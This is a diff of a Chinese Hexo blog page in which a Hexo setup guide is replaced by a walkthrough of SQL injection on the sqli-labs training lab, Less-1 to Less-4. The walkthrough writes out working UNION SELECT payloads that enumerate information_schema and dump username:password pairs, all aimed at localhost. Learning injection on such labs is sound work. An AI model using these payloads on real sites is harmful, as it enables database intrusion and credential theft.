@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>hexo博客搭建 | 0xMJ&#39;s blog</title>
-  <meta name="keywords" content=" hexo ">
-  <meta name="description" content="hexo博客搭建 | 0xMJ&#39;s blog">
+  <title>sqli-labs学习sql注入 | 0xMJ&#39;s blog</title>
+  <meta name="keywords" content=" sqli-labs ">
+  <meta name="description" content="sqli-labs学习sql注入 | 0xMJ&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="0xMJ&#39;s blog">
@@ -303,9 +303,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="w-hexo博客搭建" class="article article-type-w" itemscope itemprop="blogPost">
+        <article id="post-sqli-labs学习sql注入" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">hexo博客搭建</h1>
+        <h1 class="article-title">sqli-labs学习sql注入</h1>
     
     <div class="article-meta">
         
@@ -313,21 +313,21 @@
         
         <span class="book">
             
-            <a href="javascript:" data-rel="博客">博客</a>
+            <a href="javascript:" data-rel="信安">信安</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">hexo</a>
+            <a href="javascript:" class="color5">sqli-labs</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2017-11-22 17:19:35'>2017-11-22 16:57</time>
+        创建时间:<time class="date" title='更新时间: 2018-02-27 20:02:28'>2018-02-27 20:01</time>
         
     </div>
     <div class="article-meta">
@@ -360,7 +360,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#建立github仓库"><span class="toc-text">建立github仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地安装Git"><span class="toc-text">本地安装Git</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置SSH"><span class="toc-text">配置SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装Hexo"><span class="toc-text">安装Hexo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#安装前提"><span class="toc-text">安装前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#安装Hexo-1"><span class="toc-text">安装Hexo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改主题"><span class="toc-text">修改主题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传之前"><span class="toc-text">上传之前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传到github"><span class="toc-text">上传到github</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结：部署步骤"><span class="toc-text">总结：部署步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用hexo命令"><span class="toc-text">常用hexo命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Hexo主题的分类和标签设置："><span class="toc-text">3-Hexo主题的分类和标签设置：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs学习sql注入"><span class="toc-text">sqli-labs学习sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><span class="toc-text">Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><span class="toc-text">less 2 GET - Error based - Intiger based (基于错误的GET整型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><span class="toc-text">less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><span class="toc-text">less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -375,82 +375,71 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#hexo博客搭建</p>
-<p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p>
-<p>确认安装成功</p>
-<h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p>
-<p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p>
-<p>几个注意的地方：</p>
+        <h1 id="sqli-labs学习sql注入"><a href="#sqli-labs学习sql注入" class="headerlink" title="sqli-labs学习sql注入"></a>sqli-labs学习sql注入</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p>
+<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p>第一关就碰壁，原因是服务器端开启的magic_quotes_gpc，会把’转义成\’，在php.ini中将magic_quotes_gpc设置成Off再重启web服务即可。<br>使用火狐浏览器的hackbar插件对url进行修改，首先输入id=1，页面返回正常，<br><a href="http://localhost:9096/sqli-labs-master/Less-1/?id=1" target="_blank" rel="external">http://localhost:9096/sqli-labs-master/Less-1/?id=1</a><br>如图：<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041551_81.png" alt=""><br>通过观察发现，可以遍历id的值来获取用户名和密码<br>可以猜测后台查询语句：<br>select uername,password from talble where id = input（输入的1,2,3。。。）<br>数据库中选取当id等于input的时候，呈现出用户名和密码<br>报错类型<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041551_726.png" alt=""><br>在url框里？id = n后面添加 and 1=1 ，发现返回正常<br> and 1=2 返回也正常</p>
+<p>显然，初步猜测的sql语句错误，因为 1=1和 1=2的返回应该不同<br>此时用 ‘和\测试会报语法错误：</p>
+<p>  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1 </p>
+<p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1 </p>
+<p>最外层的单引号是标识错误的，将其隔离</p>
+<pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1
+</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p>
+<pre><code>select uername,password from talble where id = &#39;input&#39;
+-----&gt;
+select uername,password from talble where id = &#39;input 攻击代码&#39;
+</code></pre><p>————————–方法①：  <strong>引号闭合</strong>—————————–</p>
+<p>构造语句：</p>
+<p>id = 1 ‘ and ‘1’=’1(填入的是’ and ‘1’=’1)</p>
+<p>这是将程序中的单引号闭合起来，至少不会出现语法错误<br>将其放入sql语句中看看，是否和想的一样：(替代input参数）</p>
+<p>select uername,password from talble where id = ‘1   ‘ and ‘1’=’1   ‘</p>
+<p>这里可以看出所有的单引号都已经闭合了，至少不会出现语法错误<br>将这种 ‘ and ‘1’=’1 带入原始url中，发现返回页面正常<br>而 ‘ and ‘1’=’2 带入原始url中，发现返回页面不正常<br>这说明该页面有注入点</p>
+<p>————————方法②：  <strong>注释</strong>———————————–</p>
+<p>sql中的注释符    – （不是只有–，后面还有一个空格）</p>
+<p>id = 1’ and 1=1 –+<br>这里使用+替换空格，–后面必须要跟一个空格才起到注释作用<br>利用注释，可以屏蔽掉那些干扰注入语句的代码，– 后面的语句全被当成注释而不被执行</p>
+<p>现在讲 ‘ and 1=1 –+ 替换 input 值</p>
+<p>select uername,password from talble where id = ‘1   ‘ and 1=1 –+’</p>
+<p>发现 单引号已经闭合，而– 后面的单引号和其他内容都已经被注释。只要保证前面的单引号是正确的，就能达到测试的效果，‘1’的位置，单引号成对出现，and 1=1也是正确的。</p>
+<p>注释符：–+或#（# = %23）<br>用order by判断字段数<br><img src="http://oy0tigw51.bkt.clouddn.com/201710302330_441.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710302332_642.png" alt=""><br>页面返回正常，说明有3个字段。</p>
+<p>用union select联合查询看一看爆出信息的位置判断显示位(2,3处为显示位)</p>
+<pre><code>playload：
+http://localhost:9096/sqli-labs-master/Less-1/
+?id=1&#39; union select 1,2,3%23
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710302335_829.png" alt=""><br>页面的返回值和我预想的不同，预想中页面应该返回1,2,3才对，但是实际也难还是返回Dumb,说明我们构建的SQL语句有问题！！！！啊，原来页面只能返回一行的数据，当我假设id=1时，id=1的数据就占了这一行，这样语句后面的union select联合查询就不显示在页面上了，原来问题出在这里。既然如此，我让id的值没有数据即可，这里我选择让id=-1(0也可以，只要id没有这个值就行)</p>
+<pre><code>playload：
+http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3--+
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710302341_734.png" alt=""><br>爆数据库名(将显示位替换成mysql函数)</p>
+<pre><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select null,user(),database()%23
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710310045_227.png" alt=""></p>
 <blockquote>
-<p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p>
+<p>另一种查询方法<br>通过页面的返回我们可以看到只有第2列和第3列的结果显示在网页上，所以我们就只能用2,3这个位置了，但是两个位置应该是不够用的，这时我们就用到数据库的连接函数了，常用的就concat和concat_ws,还会用到group__concat(可以把查询出来的多行连接起来)，其中concat_ws的第一个参数是连接字符串的分隔符。<br>所以可以构造查询语句<br>?id=-1’ union select null,2,concat_ws(char(32,58,32),user(),database(),version())%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_913.png" alt=""></p>
 </blockquote>
-<h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p>
-<h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p>
-<p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p>
-<p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p>
-<p>$ ssh -T git@github.com<br><img src="http://oy0tigw51.bkt.clouddn.com/201711210154_534.png" alt=""></p>
-<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p>
-<h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p>
-<h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p>
-<p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p>
-<p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p>
-<p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p>
-<h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p>
-<pre><code>$ cd /f/Workspaces/hexo/
-$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo
-</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p>
-<p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p>
-<h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p>
-<h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p>
-<p>首先，ssh key肯定要配置好。</p>
-<p>其次，配置_config.yml中有关deploy的部分：</p>
-<p>正确写法：</p>
-<p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p>
-<p>错误写法：</p>
-<p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p>
-<h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p>
-<p>hexo clean<br>hexo generate<br>hexo deploy</p>
-<ol>
-<li><p>总结：本地调试</p>
-</li>
-<li><p>在执行下面的命令后，</p>
-</li>
-</ol>
-<p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p>
-<ol>
-<li>可以用简化的一条命令</li>
-</ol>
-<p>hexo s -g</p>
-<h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server –debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p>
-<h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p>
-<pre><code>代码：
-tags: 
-- 前端
-- hexo
-categories: 
-- 前端
-在博客根目录输入
-
-hexo new page tags
-打开 tags/index.md ，并改成：
-
-title: 标签
-date: 日期
-type: &quot;tags&quot;
-comments: false
-分类同理
-
-hexo new page categories
-打开category/index.md，改为：
-
-title: 分类
-date: 日期
-type: &quot;categories&quot;
-comments: false
-</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p>
-<p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_585.png" alt=""></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_329.png" alt=""></p>
+<p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。<br>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表<br>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 </p>
+<p>知道了他的数据库名称，我们就要查询数据库下的表和字段，这时我们就要借助数据库中的元数据库构造SQL语句<a href="http://blog.csdn.net/linyt/article/details/52966555" target="_blank" rel="external">元数据库</a></p>
+<p>爆表名(数据库security下的所有表名)<br>方法一：</p>
+<pre><code>playload：
+http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name),group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39;%23
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_36.png" alt=""><br>这样我们就到了所有的表名和字段名，可以看出有用的表名只有id,username和password他们都在users库中，我们选取id和password进行查询，同样适用group_concat()<br>方法二：</p>
+<pre><code>http://localhost:9096/sqli-labs-master/Less-1/
+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_648.png" alt=""></p>
+<p>爆列名(表users下的所有列名)<br><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_23.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_646.png" alt=""></p>
+<p>爆出字段值(security.users下所有的账号密码)</p>
+<p><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,version(),group_concat(username,&#39;:&#39;,password) from security.users%23</code><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_546.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_347.png" alt=""></p>
+<h3 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p>报错信息如下<br><img src="http://oy0tigw51.bkt.clouddn.com/201710311025_436.png" alt=""><br>初步猜测sql语句为：<br>select username，password from table where id = input（输入的值）<br>直接添加 and 1=1和 and 1=2，返回页面不同，说明语句应该正确<br>再次在 id = 1后面添加’: 报语法错误<br> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>错误分析：<br>near ‘’ LIMIT 0,1’ at line 1<br>先分离最外层单引号：<br>near ‘     ‘ LIMIT 0,1     ‘ at line 1<br>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：<br>select username,password from table where id = input<br>可以看到报错信息是’ LIMIT 0,1说明后台语句可能查询语句为SELECT * FROM users WHERE id=$id LIMIT 0,1，对用户的输入没有经过任何处理，直接带入数据库查询。<br>所以payload如下<br>爆表名</p>
+<pre><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311028_356.png" alt=""><br>爆列名</p>
+<pre><code>http://localhost:9096/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311033_702.png" alt=""><br>爆数据</p>
+<pre><code>http://localhost:9096/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(username,&#39;:&#39;,password) from security.users
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311034_397.png" alt=""></p>
+<h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><a href="http://localhost:9096/sqli-labs-master/Less-3/?id=1\" target="_blank" rel="external">http://localhost:9096/sqli-labs-master/Less-3/?id=1\</a><br>报出语法错误：<br> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’) LIMIT 0,1’ at line 1<br>错误分析：<br>near ‘’1\’) LIMIT 0,1’ at line 1<br>现将外层单引号去掉<br>near ‘              ‘  1\  ‘) LIMIT 0,1           ‘ at line 1<br> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )<br>所以修改sql语句：<br>select username，password from table where id = (‘input’)<br>爆表名：</p>
+<pre><code>  payload：http://localhost:9096/sqli-labs-master/Less-3/?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311322_158.png" alt=""><br>爆列名、爆数据类似</p>
+<h3 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311327_507.png" alt=""><br>错误分析：<br>near ‘“3\”) LIMIT 0,1’ at line 1<br>先分离最外层的单引号，那是用来标识错误信息的<br>near ‘           “  3\  “) LIMIT 0,1             ‘ at line 1<br>其中 3\ 是手动输入的，还剩下””)<br>说明sql语句中应该有 (“”)   （ 括号也配对）<br>再次猜测sql语句：</p>
+<pre><code>select * username,password from table where id = (&quot;input&quot;)
+</code></pre><p>爆表名</p>
+<pre><code>http://localhost:9096/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;--+
+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311329_194.png" alt=""><br>爆列名、爆数据类似</p>
 
       
        <hr><span style="font-style: italic;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
